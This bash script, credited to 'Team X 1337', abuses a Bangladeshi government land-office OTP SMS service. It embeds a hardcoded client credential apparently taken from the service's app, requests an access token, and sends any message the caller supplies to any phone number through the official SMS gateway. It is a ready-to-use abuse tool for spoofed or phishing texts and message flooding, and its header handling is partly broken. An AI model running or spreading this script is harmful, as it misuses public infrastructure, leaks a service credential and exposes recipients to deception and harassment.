#!/bin/bash

send_otp() {
    n=$1
    m=$2

    if [ -z "$n" ]; then
        echo "{\"error\":\"Please Enter Number!\"}"
        exit 1
    fi

    if [ -z "$m" ]; then
        echo "{\"error\":\"Please Enter Message!\"}"
        exit 1
    fi

    tAPI="https://idp.land.gov.bd/auth/realms/prod/protocol/openid-connect/token"

    token_headers=(
        "user-agent: Dart/3.2 (dart:io)"
        "content-type: application/x-www-form-urlencoded; charset=utf-8"
        "accept-encoding: gzip"
        "authorization: Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg=="
        "host: idp.land.gov.bd"
    )
    token_data="grant_type=client_credentials"

    token_resp=$(curl -s -X POST -H "${token_headers[@]}" -d "$token_data" "$tAPI")
    token=$(echo "$token_resp" | jq -r '.access_token')

    mAPI="https://sms-api.land.gov.bd/api/broker-service/otp/send_otp"
    otp_headers=(
        "user-agent: Dart/3.2 (dart:io)"
        "accept: application/json"
        "accept-encoding: gzip"
        "host: sms-api.land.gov.bd"
        "authorization: Bearer $token"
        "content-type: application/json; charset=utf-8"
    )
    otp_data="{\"msgTmp\": \"$m \$code\", \"destination\": \"$n\", \"otpType\": \"sms\", \"otpLength\": 0}"

    otp_resp=$(curl -s -X POST -H "${otp_headers[@]}" -d "$otp_data" "$mAPI")
    success=$(echo "$otp_resp" | jq -r '.success')
    status=$(echo "$otp_resp" | jq -r '.status')

    if [ "$success" = true ] && [ "$status" = 200 ]; then
        echo "{\"msg\": \"SMS sent to $n successfully!\", \"Developer\": \"Team X 1337\"}"
    else
        echo "{\"error\": \"Failed To Send Sms!\", \"Developer\": \"Team X 1337\"}"
    fi
}

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <number> <message>"
    exit 1
fi

send_otp "$1" "$2"
